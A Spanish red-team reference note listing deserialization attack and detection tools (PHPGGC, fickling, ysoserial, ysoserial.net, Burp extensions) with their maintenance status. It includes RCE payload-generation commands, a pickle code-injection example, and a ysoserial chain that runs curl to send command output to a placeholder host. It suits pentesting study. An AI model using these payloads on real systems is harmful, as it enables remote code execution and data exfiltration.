---
tags:
  - Web/Red-Team
  - Deserializacion
  - Tipo/Arsenal
Descripción: "El set profesional actual para detectar, generar y explotar deserialización en PHP, Python, Java y .NET, con el estado de mantenimiento de cada herramienta"
Fecha de actualización: 2026-11-20
Nota previa: "[[13 - Defensa - formatos seguros y restricción de clases]]"
Nota siguiente: ""
Area: "[[Deserialización.base|Deserialización]]"
---
---

Las herramientas de deserialización se agrupan por función: **detectar** el `sink` y el formato, **generar** la cadena de `gadgets`, e **inspeccionar** el `payload`. Lo que importa del `tooling` de este tema es que una parte está desatendida y hay que saber qué sigue vivo.

# PHP

| Herramienta | Función | Cómo / cuándo |
| --- | --- | --- |
| **PHPGGC** | Generar cadenas de `gadgets` | La referencia. `-l <fw>` lista, `-b` sale Base64, `-p phar` genera PHAR. Mantenida por Ambionics |
| **`phpggc -i`** | Inspeccionar una cadena | Muestra qué dependencias necesita en el `classpath` antes de disparar |
| **`php -a`** + arnés local | Iterar el `payload` | El laboratorio de [[03 - PHP - del sink al laboratorio local]]; `docker run php:8.3-cli` para fijar versión |

```shell-session
$ ./phpggc Laravel/RCE9 system 'id' -b          # payload Base64
$ ./phpggc -p phar Monolog/RCE1 system 'id' -o x.phar   # PHAR + gadget
$ ./phpggc -l                                    # todas las cadenas disponibles
```

<mark style="background: #ADCCFFA6;">PHPGGC es a PHP lo que `ysoserial` a Java: la colección mantenida de todas las cadenas públicas</mark>. Para cualquier framework común (Laravel, Symfony, Monolog, Guzzle, Drupal, WordPress, Magento, Doctrine) ya trae la cadena hecha; el trabajo del pentester es acertar framework y versión.

# Python

| Herramienta | Función | Nota |
| --- | --- | --- |
| **`pickletools.dis`** | Desensamblar un `pickle` | Nativo. La vía para leer qué hace un `pickle` capturado |
| **`fickling`** (Trail of Bits) | Analizar, inyectar y decompilar `pickle` | **El reemplazo vivo de PEAS.** v0.1.13 (nov-2026), Python 3.11+. Inyecta código en un `pickle` existente (`--inject`), analiza (`--check-safety`), decompila a AST y detecta polyglots de PyTorch |
| ~~PEAS~~ | Generar `payloads` multi-librería | **Muerto** (último commit 2020-04-24). Legado; usar `fickling` + exploit manual |
| **Exploit manual** | `__reduce__` a mano | Casi siempre más rápido que pelear con una herramienta ante un filtro concreto |

```shell-session
$ python3 -m pickletools payload.pkl            # desensambla SIN ejecutar
$ fickling --check-safety -p payload.pkl         # ¿este pickle es peligroso?
$ fickling --inject "print('x')" model.pkl > evil.pkl   # inyecta y sigue cargando bien
```

<mark style="background: #FFB86CA6;">`fickling` de Trail of Bits es la herramienta de referencia actual para `pickle`</mark>, tanto en ofensiva —inyecta en un modelo legítimo que sigue cargando sin levantar sospechas, mejor que fabricar uno desde cero con `__reduce__`— como en análisis. `python -m pickletools` es el triaje sin dependencias y sin ejecutar (la vía segura para un fichero no confiable). Para el ecosistema ML, `picklescan` y `modelscan` escanean modelos subidos — ver [[11 - Pickle y la deserialización insegura de modelos]] y [[15 - Arsenal de herramientas para ataques a los datos|el arsenal de ataques a datos]].

# Java

| Herramienta | Función | Estado 2026 |
| --- | --- | --- |
| **`ysoserial`** | Cadenas de `gadgets` Java. El original (`frohoff/ysoserial`) | Vivo pero **casi congelado** (~1-2 commits/año); los `payloads` funcionan, no esperes `gadgets` nuevos a ritmo |
| **`ysoserial` + `URLDNS`** | Detección ciega sin `gadgets` en el `classpath` | — |
| **`Java-Deserialization-Scanner`** (federicodotta) | Detección y explotación en Burp | **La alternativa viva y mantenida** |
| **GadgetProbe** | Enumerar el `classpath` vía DNS antes de elegir cadena | **Abandonada** (2021), sin reemplazo directo — hueco real del ecosistema |
| **Freddy** (Burp BApp) | Detección pasiva de serialización Java/.NET | **Congelada** (repo 2021, BApp 2020); funciona, no conoce nada posterior a 2020 |
| **`marshalsec`** | `gadgets` para otros formatos (JNDI, JSON Java, YAML Java) | — |

```shell-session
$ java -jar ysoserial.jar URLDNS "http://x.oastify.com"   # canario ciego
$ java -jar ysoserial.jar CommonsCollections5 'curl http://x/`id`' | base64
```

<mark style="background: #8000E1A6;">El flujo Java es: `URLDNS` para confirmar que el `readObject` es alcanzable, GadgetProbe para ver qué bibliotecas hay, y entonces la cadena concreta de `ysoserial` que esas bibliotecas permiten</mark>. Sin ese reconocimiento previo se dispara a ciegas.

# .NET

| Herramienta | Función |
| --- | --- |
| **`ysoserial.net`** | Equivalente de `ysoserial` para .NET. Cadenas para `BinaryFormatter`, `LosFormatter`, `Json.NET`, etc. |
| **Freddy** (Burp BApp) | Detección pasiva también de .NET |

> [!important]+ Contexto .NET en 2026
> `BinaryFormatter` fue **eliminado en .NET 9**: sus APIs existen pero lanzan `PlatformNotSupportedException`, y el flag de compatibilidad ya no basta. Encontrarlo funcional implica **.NET Framework** (que no está afectado y sigue expuesto) o que la app instaló el paquete `System.Runtime.Serialization.Formatters` para restaurarlo —*«unsupported and not recommended»*—, lo cual es en sí un hallazgo. La superficie viva está en `Json.NET` con `TypeNameHandling != None`, en `LosFormatter`/`ObjectStateFormatter` del ViewState de ASP.NET Framework (ver `CVE-2025-53690`, Sitecore, en el KEV de CISA), y en código heredado. `ysoserial.net` sigue activo en `master`, pero su última **release etiquetada es v1.36 (2023)**: para los `gadgets` nuevos hay que **compilar desde `master`**.

# Detección en tráfico (Burp)

| Extensión | Qué hace |
| --- | --- |
| **Freddy** | Detecta y ayuda a explotar serialización Java/.NET; marca parámetros serializados pasivamente |
| **GadgetProbe** | Sondeo del `classpath` Java |
| **Collaborator / `interactsh`** | Receptor de interacción OOB para deserialización ciega |

> [!warning]+ Verificar mantenimiento antes del engagement
> Varias de estas herramientas (Freddy, GadgetProbe, PEAS) tienen ritmos de actualización desiguales. La buena práctica del vault: antes de depender de una, comprobar su último commit/release contra la API de GitHub y tener el plan B a mano (para `pickle`, `fickling` o manual; para PHP, `phpggc` manual; para Java, `ysoserial` directo). El estado concreto de versiones se confirma en cada sesión porque cambia.

# Resumen operativo por lenguaje

- **PHP** → PHPGGC (+ `-p phar`), arnés `php -a`.
- **Python** → `fickling` para análisis e inyección, `pickletools.dis` para leer, exploit `__reduce__` manual para evadir filtros.
- **Java** → `ysoserial` (`URLDNS` primero), GadgetProbe, `marshalsec`.
- **.NET** → `ysoserial.net`.
- **Transversal** → Freddy en Burp para detección pasiva, Collaborator para ciego.

> [!info]+ Fuentes
> Repos oficiales: [PHPGGC](https://github.com/ambionics/phpggc), [ysoserial](https://github.com/frohoff/ysoserial), [ysoserial.net](https://github.com/pwntester/ysoserial.net), [fickling (Trail of Bits)](https://github.com/trailofbits/fickling), [marshalsec](https://github.com/mbechler/marshalsec). Extensiones Burp: [Freddy](https://portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3) y GadgetProbe en el BApp Store. Estado de mantenimiento a verificar contra la API de GitHub en cada uso.
